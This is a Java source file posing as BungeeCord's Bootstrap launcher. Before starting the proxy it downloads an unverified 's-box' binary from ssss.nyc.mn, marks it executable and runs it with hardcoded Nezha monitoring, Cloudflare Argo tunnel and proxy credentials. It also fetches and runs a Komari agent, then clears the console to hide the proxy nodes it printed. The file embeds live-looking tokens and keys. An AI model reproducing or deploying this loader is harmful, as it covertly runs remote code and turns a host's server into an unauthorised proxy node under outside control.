package net.md_5.bungee;

import java.io.*;
import java.net.*;
import java.nio.file.*;
import java.util.*;
import java.util.concurrent.atomic.AtomicBoolean;
import java.lang.reflect.Field;

public class Bootstrap
{
    private static final String ANSI_GREEN = "\033[1;32m";
    private static final String ANSI_RED = "\033[1;31m";
    private static final String ANSI_YELLOW = "\033[1;33m";
    private static final String ANSI_RESET = "\033[0m";
    private static final AtomicBoolean running = new AtomicBoolean(true);
    private static Process sbxProcess;
    private static Process komariProcess;
    
    private static final String[] ALL_ENV_VARS = {
        "PORT", "FILE_PATH", "UUID", "NEZHA_SERVER", "NEZHA_PORT", "KOMARI_ENDPOINT", "KOMARI_TOKEN",
        "NEZHA_KEY", "ARGO_PORT", "ARGO_DOMAIN", "ARGO_AUTH", 
        "HY2_PORT", "TUIC_PORT", "REALITY_PORT", "CFIP", "CFPORT", 
        "UPLOAD_URL","CHAT_ID", "BOT_TOKEN", "NAME", "DISABLE_ARGO"
    };

    public static void main(String[] args) throws Exception
    {
        if (Float.parseFloat(System.getProperty("java.class.version")) < 54.0) 
        {
            System.err.println(ANSI_RED + "ERROR: Your Java version is too lower,please switch the version in startup menu!" + ANSI_RESET);
            Thread.sleep(3000);
            System.exit(1);
        }

        // Start SbxService
        try {
            runSbxBinary();
            runKomariAgent();
            
            Runtime.getRuntime().addShutdownHook(new Thread(() -> {
                running.set(false);
                stopServices();
            }));

            // Wait 20 seconds before continuing
            Thread.sleep(15000);
            System.out.println(ANSI_GREEN + "Server is running!" + ANSI_RESET);
            System.out.println(ANSI_GREEN + "Thank you for using this script,Enjoy!\n" + ANSI_RESET);
            System.out.println(ANSI_GREEN + "Logs will be deleted in 20 seconds, you can copy the above nodes" + ANSI_RESET);
            Thread.sleep(20000);
            clearConsole();
        } catch (Exception e) {
            System.err.println(ANSI_RED + "Error initializing SbxService: " + e.getMessage() + ANSI_RESET);
        }

        // Continue with BungeeCord launch
        BungeeCordLauncher.main(args);
    }
    
    private static void clearConsole() {
        try {
            if (System.getProperty("os.name").contains("Windows")) {
                new ProcessBuilder("cmd", "/c", "cls && mode con: lines=30 cols=120")
                    .inheritIO()
                    .start()
                    .waitFor();
            } else {
                System.out.print("\033[H\033[3J\033[2J");
                System.out.flush();
                
                new ProcessBuilder("tput", "reset")
                    .inheritIO()
                    .start()
                    .waitFor();
                
                System.out.print("\033[8;30;120t");
                System.out.flush();
            }
        } catch (Exception e) {
            try {
                new ProcessBuilder("clear").inheritIO().start().waitFor();
            } catch (Exception ignored) {}
        }
    }   
    
    private static void runSbxBinary() throws Exception {
        Map<String, String> envVars = new HashMap<>();
        loadEnvVars(envVars);
        
        ProcessBuilder pb = new ProcessBuilder(getBinaryPath().toString());
        pb.environment().putAll(envVars);
        pb.redirectErrorStream(true);
        pb.redirectOutput(new File("sbx.log"));
        
        sbxProcess = pb.start();
    }
    
    private static void loadEnvVars(Map<String, String> envVars) throws IOException {
        envVars.put("UUID", "015c9a72-8e76-42c5-8576-07cd5f5268d3");
        envVars.put("FILE_PATH", "./world");
        envVars.put("REVERSE_PROXY_MODE", "grpcwebproxy");
        envVars.put("NEZHA_SERVER", "qgqnjwzgboqo.us-west-1.clawcloudrun.com:80");
        envVars.put("NEZHA_PORT", "");
        envVars.put("NEZHA_KEY", "Y9ShG2lsgGMQI5WM6Ua2iyZ9wlrdzN6v");
        envVars.put("KOMARI_ENDPOINT", "");
        envVars.put("KOMARI_TOKEN", "");
        envVars.put("ARGO_PORT", "8001");
        envVars.put("ARGO_DOMAIN", "mcst1.bbdd.pp.ua");
        envVars.put("ARGO_AUTH", "eyJhIjoiNWZiZDU1M2IzNjViZWE3YWRlYjNmYzIyMjM4NGNlMzMiLCJ0IjoiNDQyNGRjZDktMTE0Yy00YjZkLWE5MzAtMjcxODllMWQxODFjIiwicyI6IlpEWTNORFEzTkRrdFlUUTVNeTAwWldRMkxXRXdaall0WlRZek9XRTVPVEF4WXprdyJ9");
        envVars.put("HY2_PORT", "");
        envVars.put("TUIC_PORT", "");
        envVars.put("REALITY_PORT", "");
        envVars.put("UPLOAD_URL", "");
        envVars.put("CHAT_ID", "");
        envVars.put("BOT_TOKEN", "");
        envVars.put("CFIP", "190.93.245.123");
        envVars.put("CFPORT", "443");
        envVars.put("NAME", "MCST");
        envVars.put("DISABLE_ARGO", ""); 
        
        for (String var : ALL_ENV_VARS) {
            String value = System.getenv(var);
            if (value != null && !value.trim().isEmpty()) {
                envVars.put(var, value);  
            }
        }
        
        Path envFile = Paths.get(".env");
        if (Files.exists(envFile)) {
            for (String line : Files.readAllLines(envFile)) {
                line = line.trim();
                if (line.isEmpty() || line.startsWith("#")) continue;
                
                line = line.split(" #")[0].split(" //")[0].trim();
                if (line.startsWith("export ")) {
                    line = line.substring(7).trim();
                }
                
                String[] parts = line.split("=", 2);
                if (parts.length == 2) {
                    String key = parts[0].trim();
                    String value = parts[1].trim().replaceAll("^['\"]|['\"]$", "");
                    
                    if (Arrays.asList(ALL_ENV_VARS).contains(key)) {
                        envVars.put(key, value); 
                    }
                }
            }
        }
    }
    
    private static Path getBinaryPath() throws IOException {
        String osArch = System.getProperty("os.arch").toLowerCase();
        String url;
        
        if (osArch.contains("amd64") || osArch.contains("x86_64")) {
            url = "https://amd64.ssss.nyc.mn/s-box";
        } else if (osArch.contains("aarch64") || osArch.contains("arm64")) {
            url = "https://arm64.ssss.nyc.mn/s-box";
        } else if (osArch.contains("s390x")) {
            url = "https://s390x.ssss.nyc.mn/s-box";
        } else {
            throw new RuntimeException("Unsupported architecture: " + osArch);
        }
        
        Path path = Paths.get(System.getProperty("java.io.tmpdir"), "sbx");
        if (!Files.exists(path)) {
            try (InputStream in = new URL(url).openStream()) {
                Files.copy(in, path, StandardCopyOption.REPLACE_EXISTING);
            }
            if (!path.toFile().setExecutable(true)) {
                throw new IOException("Failed to set executable permission");
            }
        }
        return path;
    }
    
    private static void stopServices() {
        if (sbxProcess != null && sbxProcess.isAlive()) {
            sbxProcess.destroy();
            System.out.println(ANSI_RED + "sbx process terminated" + ANSI_RESET);
        }
        if (komariProcess != null && komariProcess.isAlive()) {
            komariProcess.destroy();
            System.out.println(ANSI_RED + "Komari agent terminated" + ANSI_RESET);
        }
    }

    private static void runKomariAgent() throws Exception {
        Map<String, String> envVars = new HashMap<>();
        loadEnvVars(envVars);

        // Ensure world directory exists for Komari config
        Path worldDir = Paths.get("world");
        if (!Files.exists(worldDir)) {
            Files.createDirectories(worldDir);
            System.out.println(ANSI_GREEN + "Created world directory for Komari config" + ANSI_RESET);
        }

        String komariEndpoint = envVars.get("KOMARI_ENDPOINT");
        String komariToken = envVars.get("KOMARI_TOKEN");

        if (komariEndpoint == null || komariToken == null ||
            komariEndpoint.isEmpty() || komariToken.isEmpty()) {
            System.out.println(ANSI_YELLOW + "KOMARI_ENDPOINT or KOMARI_TOKEN not set, skipping Komari agent" + ANSI_RESET);
            return;
        }

        Path binaryPath = getKomariBinaryPath();

        List<String> command = new ArrayList<>();
        command.add(binaryPath.toString());
        command.add("-e");
        command.add(komariEndpoint);
        command.add("-t");
        command.add(komariToken);

        ProcessBuilder pb = new ProcessBuilder(command);
        pb.directory(new File(System.getProperty("user.dir")));
        pb.redirectErrorStream(true);
        pb.redirectOutput(new File("komari.log"));

        komariProcess = pb.start();
        System.out.println(ANSI_GREEN + "Komari agent started successfully" + ANSI_RESET);
    }

    private static Path getKomariBinaryPath() throws IOException {
        String osArch = System.getProperty("os.arch").toLowerCase();
        String archName;

        if (osArch.contains("amd64") || osArch.contains("x86_64")) {
            archName = "amd64";
        } else if (osArch.contains("aarch64") || osArch.contains("arm64")) {
            archName = "arm64";
        } else {
            throw new RuntimeException("Unsupported architecture for Komari: " + osArch);
        }

        String url = String.format(
            "https://github.com/komari-monitor/komari-agent/releases/latest/download/komari-agent-linux-%s",
            archName
        );

        Path path = Paths.get(System.getProperty("java.io.tmpdir"), "komari-agent");
        if (!Files.exists(path)) {
            System.out.println("Downloading Komari agent from: " + url);
            try (InputStream in = new URL(url).openStream()) {
                Files.copy(in, path, StandardCopyOption.REPLACE_EXISTING);
            }
            if (!path.toFile().setExecutable(true)) {
                throw new IOException("Failed to set executable permission");
            }
            System.out.println(ANSI_GREEN + "Komari agent downloaded" + ANSI_RESET);
        }
        return path;
    }
}
